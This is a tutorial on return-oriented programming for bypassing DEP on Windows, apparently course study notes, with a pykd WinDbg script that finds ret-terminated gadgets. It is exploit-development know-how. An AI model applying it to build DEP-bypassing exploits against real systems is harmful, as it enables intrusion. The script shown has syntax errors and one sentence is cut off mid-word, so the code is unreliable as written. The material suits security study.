<p>Instead of setting in our stacks the &ldquo;libc&rdquo; or whatever function we want to execute in a memory page with execution, a more general approach was designed.
We can design a technique to call <strong>any instruction sequence we want, if these conditions are met:</strong></p>
<ul>
<li>The instruction(s) we want to execute are followed by a ret at the end</li>
<li>The instruction we want is in a memory page with execution rights.
If that condition happens, the instruction is a ROP gadget.</li>
</ul>
<p>We will replace RIP <strong>with the memory address of any &ldquo;gadget&rdquo;</strong>, so we jump to that instruction, execute it, and then return to the next instruction to execute (which will be the next element in the stack).
For that, we need to have the necessary gadgets in the application to perform our task.
The number of obtainable gadgets depends on the OS version and the vulnerable application.</p>
<h2 id="different-rop-approaches">Different ROP approaches</h2>
<p>At this point, depending on our goals and on the number of gadgets we can obtain, there are two different approaches we could take:</p>
<ol>
<li>Build a 100% ROP shellcode.</li>
<li>Build a ROP stage that can lead to subsequent execution of traditional shellcode.</li>
</ol>
<p>The first approach is rather complicated to implement, so we’ll pursue the second instead. A goal of the ROP stage could be to allocate a chunk of memory with write and execute permissions and then copy shellcode to it.</p>
<p>One way to implement this ROP attack is to allocate memory using the Win32 VirtualAlloc API. A different approach to bypass DEP could be to change the permissions of the memory page where the shellcode already resides by calling the Win32 VirtualProtect API. The address of both functions is usually retrieved from the Import Address Table (IAT) of the target DLL that contains them. Then the required parameters need to be pushed in the stack, which can also be done using ROP gadgets and are usually done dinamically using ROP gadgets as you can&rsquo;t hardcode the parameters (e.g., you might n)</p>
<p>Another alternative is to use the WriteProcessMemory to hot-patch any code section (normally the .text section) with shellcode and jump into it. Sometimes a call to NtProtectVirtualMemory or similar might be done in order to turn the memory page to writable (as code sections are normally RX but not WRX or WX).</p>
<p>However, in both approaches, we are jumping to a executable sections instead of modifying the &ldquo;NX&rdquo; flag of the memory pages of the stack.</p>
<h2 id="gadget-selection">Gadget selection</h2>
<p>So far, we have a good understanding of the theory behind DEP and how to overcome it with ROP. A key missing element is how to locate the gadgets that are needed to invoke the APIs.</p>
<p>In the classic buffer overflow, we use the WinDbg search command to obtain the address of an instruction like JMP ESP. For ROP though, we need to locate the addresses of all the possible gadgets we can obtain. This first step will allow us to choose the gadgets we need and combine them to bypass DEP.</p>
<p>However, it’s difficult to search for gadgets manually because of the large number of possible candidates. Instead, we’ll need to automate the process. We will discuss two different methods.</p>
<p><strong>Note: Typically, it is not beneficial to search for very long ROP gadgets because they will eventually contain instructions that are not useful, such as calls and jumps.</strong> The OSED course shows that more than 5 instructions could start to be a serious problem. We filter by 5 and then filter the resulting gadgets.</p>
<p>Note that:</p>
<ul>
<li>jmp and call gadgets alter the execution flow, which might break our chain.</li>
<li>push, pop gadgets change the stack, we have to be careful with that.</li>
<li>mov esp, or any esp operation, alter the stack pointer, we have to be careful with that.</li>
<li>Assembly language contains several privileged instructions, which a regular application cannot execute. We must design our algorithm to remove these also.</li>
</ul>
<pre tabindex="0"><code>Bad instructions for gadgets: Privileged + unknown opcode &#34;???&#34; + jumps/calls
BAD = [&#34;clts&#34;, &#34;hlt&#34;, &#34;lmsw&#34;, &#34;ltr&#34;, &#34;lgdt&#34;, &#34;lidt&#34; ,&#34;lldt&#34;, &#34;mov cr&#34;, &#34;mov dr&#34;, &#34;mov tr&#34;, &#34;in &#34;, &#34;ins&#34;, &#34;invlpg&#34;, &#34;invd&#34;, &#34;out&#34;, &#34;outs&#34;, &#34;cli&#34;, &#34;sti&#34; &#34;popf&#34;, &#34;pushf&#34;, &#34;int&#34;, &#34;iret&#34;, &#34;iretd&#34;, &#34;swapgs&#34;, &#34;wbinvd&#34;, &#34;call&#34;, &#34;jmp&#34;, &#34;leave&#34;, &#34;ja&#34;, &#34;jb&#34;, &#34;jc&#34;, &#34;je&#34;, &#34;jr&#34;, &#34;jg&#34;, &#34;jl&#34;, &#34;jn&#34;, &#34;jo&#34;, &#34;jp&#34;, &#34;js&#34;, &#34;jz&#34;, &#34;lock&#34;, &#34;enter&#34;, &#34;wait&#34;, &#34;???&#34;]
</code></pre><p><strong>Note</strong>: In some advanced cases, we might want to make use of a gadget containing a conditional jump instruction or a call. If we craft the stack layout appropriately, we can make use of these gadgets without disrupting the execution flow, but typically, it is best to avoid them altogether unless strictly required by specific conditions.</p>
<p><strong>Note</strong>: In x64, each memory page is 0x1000 (4kb). Each module will have several memory pages, so we want to analyze all of them in search of our gadgets. Some of them will be executable, some of them will not be.</p>
<h3 id="pykd-for-gadget-selection">Pykd for gadget selection</h3>
<p>Python-based WinDbg extension, that can be used also as individual scripts.</p>
<p>The pykd script must locate gadgets inside code pages of an EXE or DLL with the execute permission set.</p>
<p>The first step is to accept the name of the module as a parameter and locate it in memory. Then, for the selected module, we locate all memory pages that are executable.
Code that is executed on these pages will not result in DEP throwing an access violation.
For each of these memory pages, we are going to locate the memory address of all the RET assembly instructions and store them in a list.
Once we have this list of memory addresses, we pick the first one, subtract one byte from it, and disassemble the opcodes to check if they are valid assembly instructions. If they are, we have found a possible ROP gadget. This process will continue, by subtracting another byte and rechecking.</p>
<p>This is the pykd that will perform our gadget search functionality:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pykd <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HEADER <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;#&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">80</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>HEADER <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;# findrop.py - pykd module for Gadget Discovery</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>HEADER <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;#&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">80</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e">##MEM_ACCESS = {</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x1   : &#34;PAGE_NOACCESS&#34;                                                    ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x2   : &#34;PAGE_READONLY&#34;                                                    ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x4   : &#34;PAGE_READWRITE&#34;                                                   ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x8   : &#34;PAGE_WRITECOPY&#34;                                                   ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x10  : &#34;PAGE_EXECUTE&#34;                                                     ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x20  : &#34;PAGE_EXECUTE_READ&#34;                                                ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x40  : &#34;PAGE_EXECUTE_READWRITE&#34;                                           ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x80  : &#34;PAGE_EXECUTE_WRITECOPY&#34;                                           ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x101 : &#34;PAGE_NOACCESS PAGE_GUARD&#34;                                         ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x102 : &#34;PAGE_READONLY PAGE_GUARD &#34;                                        ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x104 : &#34;PAGE_READWRITE PAGE_GUARD&#34;                                        ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x108 : &#34;PAGE_WRITECOPY PAGE_GUARD&#34;                                        ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x110 : &#34;PAGE_EXECUTE PAGE_GUARD&#34;                                          ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x120 : &#34;PAGE_EXECUTE_READ PAGE_GUARD&#34;                                     ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x140 : &#34;PAGE_EXECUTE_READWRITE PAGE_GUARD&#34;                                ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x180 : &#34;PAGE_EXECUTE_WRITECOPY PAGE_GUARD&#34;                                ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x301 : &#34;PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE&#34;                            ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x302 : &#34;PAGE_READONLY PAGE_GUARD PAGE_NOCACHE&#34;                            ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x304 : &#34;PAGE_READWRITE PAGE_GUARD PAGE_NOCACHE&#34;                           ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x308 : &#34;PAGE_WRITECOPY PAGE_GUARD PAGE_NOCACHE&#34;                           ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x310 : &#34;PAGE_EXECUTE PAGE_GUARD PAGE_NOCACHE&#34;                             ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x320 : &#34;PAGE_EXECUTE_READ PAGE_GUARD PAGE_NOCACHE&#34;                        ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x340 : &#34;PAGE_EXECUTE_READWRITE PAGE_GUARD PAGE_NOCACHE&#34;                   ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x380 : &#34;PAGE_EXECUTE_WRITECOPY PAGE_GUARD PAGE_NOCACHE&#34;                   ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x701 : &#34;PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;          ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x702 : &#34;PAGE_READONLY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;          ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x704 : &#34;PAGE_READWRITE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;         ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x708 : &#34;PAGE_WRITECOPY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;         ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x710 : &#34;PAGE_EXECUTE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;           ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x720 : &#34;PAGE_EXECUTE_READ PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34;      ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x740 : &#34;PAGE_EXECUTE_READWRITE PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34; ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##0x780 : &#34;PAGE_EXECUTE_WRITECOPY PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE&#34; ,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">##}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>MEM_ACCESS_EXE <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x10</span>  : <span style="color:#e6db74">&#34;PAGE_EXECUTE&#34;</span>                                                     ,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x20</span>  : <span style="color:#e6db74">&#34;PAGE_EXECUTE_READ&#34;</span>                                                ,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x40</span>  : <span style="color:#e6db74">&#34;PAGE_EXECUTE_READWRITE&#34;</span>                                           ,
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x80</span>  : <span style="color:#e6db74">&#34;PAGE_EXECUTE_WRITECOPY&#34;</span>                                           ,
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PAGE_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>MAX_GADGET_SIZE <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BAD <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;clts&#34;</span>, <span style="color:#e6db74">&#34;hlt&#34;</span>, <span style="color:#e6db74">&#34;lmsw&#34;</span>, <span style="color:#e6db74">&#34;ltr&#34;</span>, <span style="color:#e6db74">&#34;lgdt&#34;</span>, <span style="color:#e6db74">&#34;lidt&#34;</span> ,<span style="color:#e6db74">&#34;lldt&#34;</span>, <span style="color:#e6db74">&#34;mov cr&#34;</span>, <span style="color:#e6db74">&#34;mov dr&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;mov tr&#34;</span>, <span style="color:#e6db74">&#34;in &#34;</span>, <span style="color:#e6db74">&#34;ins&#34;</span>, <span style="color:#e6db74">&#34;invlpg&#34;</span>, <span style="color:#e6db74">&#34;invd&#34;</span>, <span style="color:#e6db74">&#34;out&#34;</span>, <span style="color:#e6db74">&#34;outs&#34;</span>, <span style="color:#e6db74">&#34;cli&#34;</span>, <span style="color:#e6db74">&#34;sti&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;popf&#34;</span>, <span style="color:#e6db74">&#34;pushf&#34;</span>, <span style="color:#e6db74">&#34;int&#34;</span>, <span style="color:#e6db74">&#34;iret&#34;</span>, <span style="color:#e6db74">&#34;iretd&#34;</span>, <span style="color:#e6db74">&#34;swapgs&#34;</span>, <span style="color:#e6db74">&#34;wbinvd&#34;</span>, <span style="color:#e6db74">&#34;call&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;jmp&#34;</span>, <span style="color:#e6db74">&#34;leave&#34;</span>, <span style="color:#e6db74">&#34;ja&#34;</span>, <span style="color:#e6db74">&#34;jb&#34;</span>, <span style="color:#e6db74">&#34;jc&#34;</span>, <span style="color:#e6db74">&#34;je&#34;</span>, <span style="color:#e6db74">&#34;jr&#34;</span>, <span style="color:#e6db74">&#34;jg&#34;</span>, <span style="color:#e6db74">&#34;jl&#34;</span>, <span style="color:#e6db74">&#34;jn&#34;</span>, <span style="color:#e6db74">&#34;jo&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;jp&#34;</span>, <span style="color:#e6db74">&#34;js&#34;</span>, <span style="color:#e6db74">&#34;jz&#34;</span>, <span style="color:#e6db74">&#34;lock&#34;</span>, <span style="color:#e6db74">&#34;enter&#34;</span>, <span style="color:#e6db74">&#34;wait&#34;</span>, <span style="color:#e6db74">&#34;???&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">log</span>(msg):
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Log a message to console.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param msg: Message string
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: None
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;[+] &#34;</span> <span style="color:#f92672">+</span> msg)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">getModule</span>(modname):
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Return a module object.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param modname: string module name
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: pykd module object
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> module(modname)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">isPageExec</span>(address):
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Return True if a mem page is marked as executable
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param address: address in hex format 0x41414141.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: Bool
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>     protect <span style="color:#f92672">=</span> getVaProtect(address)
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>     protect <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> protect <span style="color:#f92672">in</span> MEM_ACCESS_EXE<span style="color:#f92672">.</span>keys():
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findExecPages</span>(mod):
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Find Executable Memory Pages for a module.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param mod: module object returned by getModule
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: a python list of executable memory pages
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span> pages <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span> pn <span style="color:#f92672">=</span> int((mod<span style="color:#f92672">.</span>end() <span style="color:#f92672">-</span> mod<span style="color:#f92672">.</span>begin()) <span style="color:#f92672">/</span> PAGE_SIZE)
</span></span><span style="display:flex;"><span> log(<span style="color:#e6db74">&#34;Total Memory Pages: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> pn)
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, pn):
</span></span><span style="display:flex;"><span>     page <span style="color:#f92672">=</span> mod<span style="color:#f92672">.</span>begin() <span style="color:#f92672">+</span> i<span style="color:#f92672">*</span>PAGE_SIZE
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span> isPageExec(page):
</span></span><span style="display:flex;"><span>         pages<span style="color:#f92672">.</span>append(page)
</span></span><span style="display:flex;"><span> log(<span style="color:#e6db74">&#34;Executable Memory Pages: </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> len(pages))
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> pages
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">findRetn</span>(pages):
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Find all return instructions for the given memory pages.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param pages: list of memory pages
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: list of memory addresses
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span> retn <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> page <span style="color:#f92672">in</span> pages:
</span></span><span style="display:flex;"><span>     ptr <span style="color:#f92672">=</span> page
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">while</span> ptr <span style="color:#f92672">&lt;</span> (page <span style="color:#f92672">+</span> PAGE_SIZE):
</span></span><span style="display:flex;"><span>         b <span style="color:#f92672">=</span> loadSignBytes(ptr, <span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">if</span> b <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0xc3</span>, <span style="color:#ae81ff">0xc2</span>]:
</span></span><span style="display:flex;"><span>             ptr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>             retn<span style="color:#f92672">.</span>append(ptr)
</span></span><span style="display:flex;"><span>             ptr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span> log(<span style="color:#e6db74">&#34;Found </span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> ret instructions&#34;</span> <span style="color:#f92672">%</span> len(retn))
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> retn
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">formatInstr</span>(instr, mod):
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Replace address with modbase+offset.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param instr: instruction string from disasm.instruction()
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param mod: module object from getModule
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: formatted instruction string: modbase+offset instruction
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span> address <span style="color:#f92672">=</span> int(instr[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">8</span>], <span style="color:#ae81ff">0x10</span>)
</span></span><span style="display:flex;"><span> offset <span style="color:#f92672">=</span> address <span style="color:#f92672">-</span> mod<span style="color:#f92672">.</span>begin()
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">+0x</span><span style="color:#e6db74">%x</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (mod<span style="color:#f92672">.</span>name(), offset, instr[<span style="color:#ae81ff">9</span>:])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">disasmGadget</span>(addr, mod, fp)
</span></span><span style="display:flex;"><span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> Find gadgets. Start from a ret instruction and crawl back from 1 to
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> MAX_GADGET_SIZE bytes. At each iteration disassemble instructions and
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> make sure the result gadget has no invalid instruction and is still
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> ending with a ret.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param addr: address of a ret instruction
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param mod: module object from getModule
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @param fp: file object to log found gadgets
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> @return: number of gadgets found starting from a specific address
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, MAX_GADGET_SIZE):
</span></span><span style="display:flex;"><span>     gadget <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>     ptr <span style="color:#f92672">=</span> addr <span style="color:#f92672">-</span> i
</span></span><span style="display:flex;"><span>     dasm <span style="color:#f92672">=</span> disasm(ptr)
</span></span><span style="display:flex;"><span>     gadget_size <span style="color:#f92672">=</span> dasm<span style="color:#f92672">.</span>length()
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">while</span> gadget_size <span style="color:#f92672">&lt;=</span> MAX_GADGET_SIZE:
</span></span><span style="display:flex;"><span>         instr <span style="color:#f92672">=</span> dasm<span style="color:#f92672">.</span>instruction()
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">if</span> any(bad <span style="color:#f92672">in</span> instr <span style="color:#66d9ef">for</span> bad <span style="color:#f92672">in</span> BAD):
</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         gadget<span style="color:#f92672">.</span>append(instr)
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">if</span> instr<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;ret&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>         dasm<span style="color:#f92672">.</span>disasm()
</span></span><span style="display:flex;"><span>         gadget_size <span style="color:#f92672">+=</span> dasm<span style="color:#f92672">.</span>length()
</span></span><span style="display:flex;"><span>     matching <span style="color:#f92672">=</span> [i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> gadget <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;ret&#34;</span> <span style="color:#f92672">in</span> i]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span> matching:
</span></span><span style="display:flex;"><span>         count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>         fp<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">86</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">for</span> instr <span style="color:#f92672">in</span> gadget:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                fp<span style="color:#f92672">.</span>write(str(instr) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">UnicodeEncodeError</span>:
</span></span><span style="display:flex;"><span>                print(str(repr(instr)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">return</span> count
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;#&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">63</span>)
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;# findrop.py pykd Gadget Discovery module #&#34;</span>)
</span></span><span style="display:flex;"><span> print(<span style="color:#e6db74">&#34;#&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">63</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>     modname <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IndexError</span>:
</span></span><span style="display:flex;"><span>     log(<span style="color:#e6db74">&#34;Syntax: findrop.py modulename [MAX_GADGET_SIZE]&#34;</span>)
